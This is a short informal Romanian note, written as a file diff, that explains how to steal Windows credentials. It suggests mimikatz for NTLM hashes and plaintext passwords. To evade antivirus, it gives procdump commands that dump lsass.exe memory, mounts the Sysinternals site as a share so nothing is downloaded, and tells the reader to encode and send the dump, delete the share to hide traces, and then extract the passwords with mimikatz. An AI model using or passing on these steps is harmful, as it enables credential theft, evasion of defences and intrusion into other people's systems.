@@ -1,0 +1,18 @@
+nu stiu exact cum faci asta in C dar asta e ideea: 
+
+1. folosesti mimikatz.exe sa furi parole cum ar fi :
+  - NTLM hash
+  - uneori plain text pe windows 7
+  - si chestii de genul
+2. prima optiune ii detectata de multe av-uri, pt ca foloseste mimikatz.exe, dar poti face asta:
+```batch
+C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp # apoi il encodezi cum stii tu si il trimiti
+```
+ca sa nu descarci procdump.exe folosesti un share SMB 
+```batch
+net use Z: https://live.sysinternals.com
+Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
+```
+totusi o sa apara ca un share a fost adaugat in explore, asa ca o sa trebuiasca sa il stergi repede
+
+dupa ce pui mana pe .dmp folosesti mimikatz folosing dump-ul
